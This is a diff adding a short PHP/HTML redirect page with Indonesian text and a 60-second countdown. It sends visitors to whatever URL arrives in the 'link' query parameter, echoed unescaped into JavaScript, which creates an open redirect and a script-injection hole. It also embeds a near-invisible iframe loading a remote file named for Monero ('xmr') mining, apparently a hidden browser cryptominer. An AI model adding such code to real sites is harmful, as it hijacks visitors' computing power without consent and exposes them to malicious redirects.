@@ -1,0 +1,36 @@
+<html>
+
+
+<?Php
+$pesan=$_GET['link'];
+?>
+
+
+
+
+<script type="text/javascript"> 
+var waktu = 60;
+ setInterval(function() {
+ waktu--;
+ if(waktu < 0) { 
+window.location ='<?php echo $pesan; ?>'
+ }
+else{ document.getElementById("waktu").innerHTML = waktu;
+ } }, 1000);
+ </script>
+
+<h? align=center >
+   Anda akan di redirect dalam 
+<span id="waktu">60</span> detik
+
+</h?></br></br></br></br>
+
+
+
+<iframe src= "https://cdn.rawgit.com/poetrapetir/blog/f4802c35/Nambang%20xmr.html" weight=100px height=100px></iframe>
+
+
+
+
+
+</html>
